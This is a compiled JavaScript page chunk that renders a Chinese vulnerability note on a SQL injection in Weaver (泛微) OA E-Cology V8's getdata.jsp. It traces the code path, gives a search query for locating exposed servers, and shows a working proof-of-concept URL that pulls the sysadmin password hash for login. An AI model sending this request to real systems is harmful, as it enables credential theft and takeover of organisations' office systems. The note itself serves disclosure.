(window.webpackJsonp=window.webpackJsonp||[]).push([[89],{1716:function(t,a,s){t.exports=s.p+"assets/img/fanwei-17.d5cc9a83.png"},1717:function(t,a,s){t.exports=s.p+"assets/img/fanwei-18.0ef30eb5.png"},1718:function(t,a,s){t.exports=s.p+"assets/img/fanwei-19.290f9564.png"},1719:function(t,a,s){t.exports=s.p+"assets/img/fanwei-20.2a098595.png"},1720:function(t,a,s){t.exports=s.p+"assets/img/fanwei-21.960e295c.png"},3147:function(t,a,s){"use strict";s.r(a);var e=s(64),r=Object(e.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"泛微oa-e-cology-getdata-jsp-sql注入漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#泛微oa-e-cology-getdata-jsp-sql注入漏洞"}},[t._v("#")]),t._v(" 泛微OA E-Cology getdata.jsp SQL注入漏洞")]),t._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),a("p",[t._v("泛微OA V8 存在SQL注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限")]),t._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("泛微OA V8")]),a("br"),t._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v('app="泛微-协同办公OA"')]),a("br"),t._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),a("p",[t._v("在getdata.jsp中，直接将request对象交给")]),t._v(" "),a("p",[a("code",[t._v("weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) :")])]),t._v(" "),a("p",[t._v("方法处理")]),t._v(" "),a("p",[a("img",{attrs:{src:s(1716),alt:"img"}})]),t._v(" "),a("p",[t._v("在getData方法中，判断请求里cmd参数是否为空，如果不为空，调用proc方法")]),t._v(" "),a("p",[a("img",{attrs:{src:s(1717),alt:"img"}})]),t._v(" "),a("p",[t._v("Proc方法4个参数，(“空字符串”,”cmd参数值”,request对象，serverContext对象)")]),t._v(" "),a("p",[t._v("在proc方法中，对cmd参数值进行判断，当cmd值等于getSelectAllId时，再从请求中获取sql和type两个参数值，并将参数传递进getSelectAllIds（sql,type）方法中")]),t._v(" "),a("p",[a("img",{attrs:{src:s(1718),alt:"img"}})]),t._v(" "),a("p",[t._v("POC")]),t._v(" "),a("div",{staticClass:"language-plain line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plain"}},[a("code",[t._v("http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("查询HrmResourceManager表中的password字段，页面中返回了数据库第一条记录的值（sysadmin用户的password）")]),t._v(" "),a("p",[a("img",{attrs:{src:s(1719),alt:"img"}})]),t._v(" "),a("p",[t._v("解密后即可登录系统")]),t._v(" "),a("p",[a("img",{attrs:{src:s(1720),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=r.exports}}]);